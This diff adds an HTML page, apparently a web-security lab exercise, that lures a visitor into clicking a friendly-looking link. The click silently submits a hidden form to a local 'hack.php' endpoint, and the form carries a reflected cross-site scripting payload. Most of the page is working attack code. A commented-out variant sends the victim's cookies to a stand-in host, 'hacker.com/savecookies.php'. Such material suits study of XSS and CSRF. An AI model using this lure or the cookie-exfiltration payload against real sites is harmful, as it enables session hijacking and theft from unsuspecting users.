@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<!-- Hacker's Page -->
+<html>
+	<head>
+		<title>Not a Hacker's Page</title>
+		<script type="text/javascript">
+			function sendScript(event)
+			{
+				event.preventDefault(); // lol
+				form = document.getElementById("milkyform");
+				user = document.createElement("input");
+				user.type = "text";
+				user.name = "user";
+				user.value = "<script type='text/javascript'>alert('hi');<\/script>";
+				// user.value = "<script type='text/javascript'>img = document.createElement('img'); img.src = 'hacker.com/savecookies.php?str='" + document.cookie + ";<\/script>";
+				// <\/script> or else the HTML interpreter will detect this as a closing script tag
+				form.appendChild(user);
+				form.submit();
+				form.removeChild(user);
+			}
+		</script>
+	</head>
+	<body>
+		<div>
+			<h2>Welcome User! Please feel to browse this site!</h2>
+			<h2>Lots of free material here</h2>
+			<form id="milkyform" action="http://localhost/web2.0/hack.php" method="GET">
+			</form>
+			<h3>You can also go to doodhwala's site <a href="http://localhost/web2.0/hack.php" onclick="sendScript(event)">here</a></h3>
+			<!-- Hacker wants you to go to your destination via him -->
+			<h4>Have a great day >:D</h4>
+		</div>
+	</body>
+</html>
